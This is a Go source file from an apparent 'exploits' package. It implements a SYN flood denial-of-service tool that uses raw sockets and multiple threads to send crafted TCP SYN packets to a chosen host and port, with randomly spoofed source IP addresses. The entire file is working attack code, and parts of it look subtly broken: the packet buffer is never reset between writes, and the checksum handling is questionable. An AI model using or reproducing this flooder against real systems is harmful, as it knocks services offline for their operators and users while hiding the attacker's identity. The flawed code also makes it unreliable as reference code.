package exploits

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"sync"
	"syscall"
	"time"

	"github.com/adrianosela/packets"
)

// SYNFlood floods a given host:port with SYN TCP packets
func SYNFlood(host string, port, packets, threads int, logEvents bool) error {
	if threads == 0 || packets == 0 {
		return fmt.Errorf("threads or packets cannot be zero")
	}
	dstIP := net.ParseIP(host).To4()
	if dstIP == nil {
		return fmt.Errorf("destination address cannot be empty")
	}
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		return err
	}
	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
	if err != nil {
		return err
	}
	file := os.NewFile(uintptr(fd), "socket")
	rawSocket, err := net.FileConn(file)
	if err != nil {
		return err
	}

	if logEvents {
		log.Printf("[SYNFLOOD] dispatching %d threads to perform synflood", threads)
	}

	var waitgroup sync.WaitGroup
	for t := 0; t < threads; t++ {
		waitgroup.Add(1)
		go func(threadID int) {
			buff := bytes.NewBuffer(nil)
			for i := 0; i < packets/threads; i++ {
				if logEvents {
					log.Printf("[SYNFLOOD | thread %d] writing packet %d/%d", threadID+1, i+1, packets/threads)
				}
				rawIPv4Hdr := getIPv4Header(dstIP)
				rawTCPHdr := getTCPHeader(port)
				buff.Write(rawIPv4Hdr)
				buff.Write(rawTCPHdr)
				if _, err := rawSocket.Write(buff.Bytes()); err != nil {
					log.Printf("[SYNFLOOD | thread %d] error writing packet %d/%d: %s", threadID+1, i+1, packets/threads, err)
				}
			}
			waitgroup.Done()
		}(t)
	}

	waitgroup.Wait() // for now block
	return nil
}

func getIPv4Header(dstIP net.IP) []byte {
	// seed random number generation
	rand.Seed(time.Now().UnixNano())

	// spoof source IP
	srcIP := net.IP(make([]byte, 4))
	binary.BigEndian.PutUint32(srcIP[0:4], uint32(rand.Intn(1<<32-1)))

	// create an IPv4 header with generic values
	ipv4Hdr := &packets.IPv4Header{
		ID:       1,
		TTL:      255,
		Protocol: syscall.IPPROTO_TCP,
		Checksum: 0,
		Src:      srcIP,
		Dst:      dstIP,
	}

	// add raw IPv4 header checksum to IPv4 header
	ipv4HdrBytes := packets.RawIPv4Header(ipv4Hdr)
	ipv4Hdr.Checksum = int(packets.CRC16Checksum(ipv4HdrBytes))

	return packets.RawIPv4Header(ipv4Hdr)
}

func getTCPHeader(dstPort int) []byte {
	// seed random number generation
	rand.Seed(time.Now().UnixNano())

	// create an TCP header with generic values and a SYN flag
	tcpHdr := &packets.TCPHeader{
		Src:  rand.Intn(1<<16-1)%16383 + 49152,
		Dst:  dstPort,
		Seq:  rand.Intn(1<<32 - 1),
		Ack:  0,
		Flag: 0x02, // SYN flag
		Win:  2048,
		Urp:  0,
	}

	// add raw TCP header checksum to TCP header
	tcpHdrBytes := packets.RawTCPHeader(tcpHdr)
	tcpHdr.Sum = int(packets.CRC16Checksum(tcpHdrBytes))

	return packets.RawTCPHeader(tcpHdr)
}
